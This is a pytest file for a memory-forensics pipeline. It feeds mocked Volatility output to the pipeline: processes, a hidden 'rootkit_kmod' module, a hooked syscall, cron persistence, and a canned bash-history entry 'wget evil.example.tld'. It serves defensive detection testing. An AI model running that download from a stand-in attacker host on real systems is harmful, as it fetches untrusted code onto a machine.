"""Unit tests for the memory-image pipeline (mocked Volatility)."""
import asyncio
from pathlib import Path
from unittest.mock import AsyncMock, patch

import pytest

from chimera.adapters.registry import AdapterRegistry
from chimera.adapters.volatility import VolatilityAdapter
from chimera.core.cache import AnalysisCache
from chimera.core.config import ChimeraConfig
from chimera.core.resource_manager import ResourceManager
from chimera.model.binary import BinaryFormat, Platform


def _build_minimal_lime(tmp_path: Path) -> Path:
    p = tmp_path / "core.lime"
    p.write_bytes(b"LiME" + b"\x00" * 200)
    return p


@pytest.fixture
def setup(tmp_path):
    cfg = ChimeraConfig(project_dir=tmp_path/"p", cache_dir=tmp_path/"c")
    cache = AnalysisCache(cfg.cache_dir)
    rm = ResourceManager(total_ram_mb=None)
    reg = AdapterRegistry()
    # Register a "real" Volatility adapter and patch its is_available to
    # False — pipeline should still produce a model without crashing.
    vol = VolatilityAdapter()
    vol._vol_bin = None  # force unavailable
    reg.register(vol)
    return cfg, cache, rm, reg


def test_memory_pipeline_no_volatility_returns_minimal_model(setup, tmp_path):
    from chimera.pipelines.memory import analyze_memory
    cfg, cache, rm, reg = setup
    img = _build_minimal_lime(tmp_path)
    model = asyncio.run(analyze_memory(img, cfg, reg, rm, cache))
    assert model is not None
    assert model.binary.platform == Platform.LINUX_MEMORY
    assert model.binary.format == BinaryFormat.MEMORY_LIME


def test_memory_pipeline_writes_triage_cache(setup, tmp_path):
    from chimera.pipelines.memory import analyze_memory
    cfg, cache, rm, reg = setup
    img = _build_minimal_lime(tmp_path)
    model = asyncio.run(analyze_memory(img, cfg, reg, rm, cache))
    triage = cache.get_json(model.binary.sha256, "triage")
    assert triage is not None
    assert triage["platform"] == "linux_memory"


def test_memory_pipeline_with_mocked_plugins(setup, tmp_path):
    from chimera.pipelines.memory import analyze_memory
    cfg, cache, rm, reg = setup
    img = _build_minimal_lime(tmp_path)

    # Build a fake adapter that pretends to be available and returns
    # canned output per plugin.
    canned = {
        "linux.banner.Banners": {"rows": [{"Banner": "Linux 5.15.0"}]},
        "linux.pslist.PsList": {"rows": [
            {"PID": 1, "PPID": 0, "COMM": "init"},
            {"PID": 100, "PPID": 1, "COMM": "sshd"},
        ]},
        "linux.pstree.PsTree": {"rows": [
            {"PID": 1, "PPID": 0, "COMM": "init"},
            {"PID": 100, "PPID": 1, "COMM": "sshd"},
        ]},
        "linux.bash.Bash": {"rows": [
            {"PID": 100, "Process": "bash", "Command": "wget evil.example.tld"},
        ]},
        "linux.sockstat.Sockstat": {"rows": [
            {"Family": "AF_INET", "Protocol": "TCP", "State": "ESTABLISHED",
             "Source": "10.0.0.1", "Source Port": 5555,
             "Destination": "1.2.3.4", "Destination Port": 80,
             "PID": 100, "Process": "wget"},
        ]},
        "linux.malfind.Malfind": {"rows": [
            {"PID": 999, "Process": "evil", "Start": "0x7f1234",
             "End": "0x7f5678", "Protection": "rwx"},
        ]},
        "linux.lsmod.Lsmod": {"rows": [
            {"Name": "ext4", "Offset": "0xfff", "Size": 1024},
        ]},
        "linux.check_modules.Check_modules": {"rows": [
            {"Name": "rootkit_kmod", "Offset": "0xdeadbeef"},
        ]},
        "linux.check_syscall.Check_syscall": {"rows": [
            {"Index": 0, "Name": "sys_read", "Handler": "0x0", "Symbol": "sys_read"},
            {"Index": 1, "Name": "sys_open", "Handler": "0x0", "Symbol": "UNKNOWN"},
        ]},
    }

    async def fake_analyze(self, binary_path, options):
        plugin = options.get("plugin", "")
        if plugin in canned:
            return {"available": True, "plugin": plugin, "rows": canned[plugin]["rows"]}
        return {"available": True, "plugin": plugin, "rows": []}

    with patch.object(VolatilityAdapter, "is_available", return_value=True), \
         patch.object(VolatilityAdapter, "analyze", new=fake_analyze):
        model = asyncio.run(analyze_memory(img, cfg, reg, rm, cache))

    # Pipeline should populate the model + caches
    sha = model.binary.sha256
    assert cache.get_json(sha, "vol_pslist") is not None
    assert cache.get_json(sha, "vol_bash") is not None
    assert cache.get_json(sha, "vol_netstat") is not None
    assert cache.get_json(sha, "vol_malfind") is not None
    assert cache.get_json(sha, "vol_lsmod") is not None
    assert cache.get_json(sha, "vol_check_modules") is not None

    # Bash command should be added to model.strings
    bash_strings = [s for s in model.get_strings() if "wget" in s.value]
    assert len(bash_strings) >= 1

    # Memory protection summary
    summary = cache.get_json(sha, "memory_protection")
    assert summary is not None
    assert summary["process_count"] == 2
    assert summary["bash_command_count"] == 1
    assert summary["malfind_hit_count"] == 1
    assert summary["hidden_module_count"] == 1
    assert summary["hooked_syscall_count"] == 1


def test_memory_pipeline_falls_back_to_netstat_when_sockstat_unavailable(setup, tmp_path):
    from chimera.pipelines.memory import analyze_memory
    cfg, cache, rm, reg = setup
    img = _build_minimal_lime(tmp_path)

    async def fake_analyze(self, binary_path, options):
        plugin = options.get("plugin", "")
        if plugin == "linux.sockstat.Sockstat":
            # Pretend sockstat fails
            return {"available": True, "plugin": plugin, "rows": [], "error": "nope"}
        if plugin == "linux.netstat.Netstat":
            return {"available": True, "plugin": plugin, "rows": [
                {"Proto": "tcp", "LocalAddr": "0.0.0.0", "LPort": 22,
                 "RemoteAddr": "0.0.0.0", "RPort": 0, "State": "LISTEN"},
            ]}
        return {"available": True, "plugin": plugin, "rows": []}

    with patch.object(VolatilityAdapter, "is_available", return_value=True), \
         patch.object(VolatilityAdapter, "analyze", new=fake_analyze):
        model = asyncio.run(analyze_memory(img, cfg, reg, rm, cache))

    netstat = cache.get_json(model.binary.sha256, "vol_netstat")
    assert netstat is not None
    assert len(netstat.get("rows") or []) == 1


def test_memory_pipeline_persistence_phase_runs(setup, tmp_path):
    from chimera.pipelines.memory import analyze_memory
    cfg, cache, rm, reg = setup
    img = _build_minimal_lime(tmp_path)

    canned = {
        "linux.pagecache.Files": [
            {"Inode": 100, "Path": "/etc/cron.d/evil", "Size": 100},
            {"Inode": 200, "Path": "/etc/systemd/system/x.service", "Size": 256},
            {"Inode": 300, "Path": "/usr/bin/ls", "Size": 130000},
        ],
    }

    async def fake_analyze(self, binary_path, options):
        plugin = options.get("plugin", "")
        return {"available": True, "plugin": plugin, "rows": canned.get(plugin, [])}

    with patch.object(VolatilityAdapter, "is_available", return_value=True), \
         patch.object(VolatilityAdapter, "analyze", new=fake_analyze):
        model = asyncio.run(analyze_memory(img, cfg, reg, rm, cache))

    persistence = cache.get_json(model.binary.sha256, "memory_persistence")
    assert persistence is not None
    assert persistence["files_inspected"] >= 3
    cats = {f["category"] for f in persistence["findings"]}
    assert "cron" in cats
    assert "systemd_unit" in cats

    summary = cache.get_json(model.binary.sha256, "memory_protection")
    assert summary["persistence_finding_count"] >= 2
